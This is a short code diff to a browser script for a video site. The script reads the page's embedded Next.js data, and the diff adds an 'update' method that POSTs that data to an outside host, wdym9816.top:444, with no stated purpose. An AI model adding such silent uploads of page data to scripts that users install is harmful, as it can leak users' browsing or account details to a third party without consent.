@@ -19,10 +19,22 @@ class Vixen {
     constructor() {
         this.studio = location.host.split('.')[1]
         this.videos = JSON.parse(localStorage.getItem('videos') || '{}')
-        this.buildId = JSON.parse(document.querySelector('script#__NEXT_DATA__').innerHTML).buildId
+        this.info=JSON.parse(document.querySelector('script#__NEXT_DATA__').innerHTML)
+        this.buildId = this.info.buildId
         this.run()
     }
-
+    
+  update = () => {
+    console.log(this.info.length);
+    let url = "https://www.wdym9816.top:444/api/update/vixen/";
+    return fetch(url, {
+      method: "POST",
+      mode: "cors",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(this.info),
+    }).then((res) => {if(res.ok){this.info=[]}});
+  };
+    
     run = async ()=>{
         if(document.querySelector('div.VideosSidebar__Main-sc-11jbuek-1.AJrQs')) document.querySelector('div.VideosSidebar__Main-sc-11jbuek-1.AJrQs').style.display='none';
         let divs=document.querySelectorAll('.Grid__GridContainer-f0cb34-0.bUAzPt.VideoList__VideoListContainer-sc-1u75cgc-0.eliAOo.videos__StyledVideoList-sc-1u2b7uh-3.dTsEcV>div.Grid__Item-f0cb34-1.dSIsBc')
